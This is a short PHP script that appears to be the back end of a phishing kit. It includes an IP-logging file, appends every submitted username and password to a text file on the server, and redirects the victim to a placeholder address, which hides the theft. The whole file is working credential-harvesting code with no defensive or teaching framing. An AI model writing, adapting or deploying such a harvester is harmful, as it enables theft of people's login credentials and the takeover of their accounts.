<?php
include 'ip.php';

file_put_contents("usernames.txt", "[USERNAME]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
